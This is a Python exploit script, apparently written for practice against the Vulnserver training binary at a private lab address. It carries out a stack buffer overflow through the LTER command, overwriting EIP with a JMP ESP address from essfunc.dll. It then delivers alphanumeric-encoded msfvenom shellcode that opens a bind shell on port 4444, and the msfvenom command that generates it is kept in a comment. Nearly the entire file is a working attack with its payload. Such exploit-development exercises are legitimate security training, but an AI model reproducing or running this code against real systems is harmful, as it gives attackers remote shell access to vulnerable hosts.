import socket

target = "192.168.110.132"
port = 9999

command = b"LTER /.:/"

# Alphanumeric with BufferRegiter poting to ESP as shellcode cannot have non-alphanumeric chars
# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -b '\x00' BufferRegister=ESP -f python -v shell
shell =  b""
shell += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shell += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shell += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shell += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shell += b"\x42\x75\x4a\x49\x59\x6c\x48\x68\x4b\x32\x45\x50"
shell += b"\x67\x70\x63\x30\x55\x30\x4d\x59\x38\x65\x34\x71"
shell += b"\x39\x50\x45\x34\x4e\x6b\x62\x70\x56\x50\x6c\x4b"
shell += b"\x46\x32\x54\x4c\x6c\x4b\x72\x72\x56\x74\x6e\x6b"
shell += b"\x61\x62\x77\x58\x36\x6f\x6c\x77\x72\x6a\x47\x56"
shell += b"\x44\x71\x39\x6f\x6e\x4c\x77\x4c\x63\x51\x43\x4c"
shell += b"\x65\x52\x56\x4c\x45\x70\x5a\x61\x78\x4f\x64\x4d"
shell += b"\x75\x51\x58\x47\x7a\x42\x49\x62\x33\x62\x70\x57"
shell += b"\x4c\x4b\x50\x52\x46\x70\x4e\x6b\x73\x7a\x45\x6c"
shell += b"\x6e\x6b\x50\x4c\x37\x61\x44\x38\x69\x73\x37\x38"
shell += b"\x47\x71\x4b\x61\x42\x71\x4c\x4b\x46\x39\x31\x30"
shell += b"\x66\x61\x4e\x33\x6e\x6b\x73\x79\x56\x78\x6a\x43"
shell += b"\x75\x6a\x77\x39\x4e\x6b\x30\x34\x4e\x6b\x66\x61"
shell += b"\x4b\x66\x76\x51\x4b\x4f\x4c\x6c\x6a\x61\x68\x4f"
shell += b"\x76\x6d\x73\x31\x4a\x67\x77\x48\x49\x70\x61\x65"
shell += b"\x49\x66\x73\x33\x51\x6d\x5a\x58\x55\x6b\x71\x6d"
shell += b"\x65\x74\x72\x55\x79\x74\x76\x38\x4e\x6b\x62\x78"
shell += b"\x74\x64\x65\x51\x4a\x73\x43\x56\x4e\x6b\x46\x6c"
shell += b"\x50\x4b\x4c\x4b\x73\x68\x37\x6c\x57\x71\x6e\x33"
shell += b"\x4c\x4b\x67\x74\x6c\x4b\x55\x51\x68\x50\x6b\x39"
shell += b"\x53\x74\x45\x74\x35\x74\x71\x4b\x43\x6b\x61\x71"
shell += b"\x53\x69\x61\x4a\x72\x71\x79\x6f\x69\x70\x73\x6f"
shell += b"\x51\x4f\x53\x6a\x4e\x6b\x77\x62\x5a\x4b\x4c\x4d"
shell += b"\x73\x6d\x35\x38\x74\x73\x77\x42\x75\x50\x57\x70"
shell += b"\x72\x48\x32\x57\x44\x33\x75\x62\x53\x6f\x43\x64"
shell += b"\x52\x48\x42\x6c\x53\x47\x74\x66\x77\x77\x49\x6f"
shell += b"\x78\x55\x6f\x48\x6c\x50\x53\x31\x73\x30\x47\x70"
shell += b"\x64\x69\x4a\x64\x32\x74\x42\x70\x52\x48\x45\x79"
shell += b"\x4f\x70\x62\x4b\x63\x30\x39\x6f\x69\x45\x32\x4a"
shell += b"\x64\x48\x51\x49\x36\x30\x58\x62\x69\x6d\x77\x30"
shell += b"\x56\x30\x77\x30\x70\x50\x65\x38\x4b\x5a\x76\x6f"
shell += b"\x69\x4f\x39\x70\x4b\x4f\x7a\x75\x4a\x37\x33\x58"
shell += b"\x67\x72\x65\x50\x76\x71\x51\x4c\x4f\x79\x6b\x56"
shell += b"\x53\x5a\x62\x30\x76\x36\x73\x67\x31\x78\x4a\x62"
shell += b"\x39\x4b\x30\x37\x72\x47\x6b\x4f\x7a\x75\x33\x67"
shell += b"\x71\x78\x68\x37\x4d\x39\x74\x78\x59\x6f\x6b\x4f"
shell += b"\x48\x55\x56\x37\x33\x58\x71\x64\x48\x6c\x47\x4b"
shell += b"\x4d\x31\x39\x6f\x38\x55\x46\x37\x6a\x37\x43\x58"
shell += b"\x54\x35\x32\x4e\x42\x6d\x71\x71\x6b\x4f\x4b\x65"
shell += b"\x50\x68\x61\x73\x50\x6d\x32\x44\x37\x70\x6b\x39"
shell += b"\x39\x73\x30\x57\x42\x77\x46\x37\x66\x51\x4c\x36"
shell += b"\x30\x6a\x65\x42\x62\x79\x53\x66\x6a\x42\x79\x6d"
shell += b"\x31\x76\x78\x47\x70\x44\x46\x44\x55\x6c\x65\x51"
shell += b"\x33\x31\x4c\x4d\x63\x74\x56\x44\x56\x70\x6f\x36"
shell += b"\x47\x70\x42\x64\x70\x54\x50\x50\x53\x66\x56\x36"
shell += b"\x32\x76\x62\x66\x66\x36\x32\x6e\x63\x66\x53\x66"
shell += b"\x33\x63\x61\x46\x75\x38\x61\x69\x68\x4c\x57\x4f"
shell += b"\x6b\x36\x69\x6f\x6b\x65\x6c\x49\x39\x70\x42\x6e"
shell += b"\x73\x66\x30\x46\x4b\x4f\x54\x70\x35\x38\x46\x68"
shell += b"\x4c\x47\x45\x4d\x31\x70\x39\x6f\x7a\x75\x4f\x4b"
shell += b"\x38\x70\x6c\x75\x6d\x72\x42\x76\x30\x68\x4d\x76"
shell += b"\x6c\x55\x6f\x4d\x4d\x4d\x59\x6f\x6b\x65\x57\x4c"
shell += b"\x46\x66\x31\x6c\x36\x6a\x6d\x50\x39\x6b\x39\x70"
shell += b"\x61\x65\x35\x55\x4f\x4b\x42\x67\x54\x53\x74\x32"
shell += b"\x30\x6f\x52\x4a\x53\x30\x52\x73\x59\x6f\x4a\x75"
shell += b"\x41\x41"


buffer =  b''
buffer += b'A' * (2003 - len(buffer))
#uffer += b'B' * 4 # EIP location
buffer += b'\x05\x12\x50\x62' # EIP - 0x62501205 - JUMP ESP - essfunc.dll
#buffer += b'PhLULZX5LULZX'  # alphanumeric NOPs
#buffer += b'PRQXYZQPRXZY'  # alphanumeric NOPs
buffer += shell
buffer += b'C' * ( 2900 - len(buffer))

print(buffer)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target,port))
    sock.recv(1024)

    payload = command + buffer
    #sock.send(payload.encode("utf-8"))
    sock.send(payload)
    
    print("Buffering with: "+str(len(buffer))+" characters...",end="\r")
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    print("\nPwned? Maybe the binary crashed with "+str(len(buffer))+" \"A\" characters :)")
    exit()
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()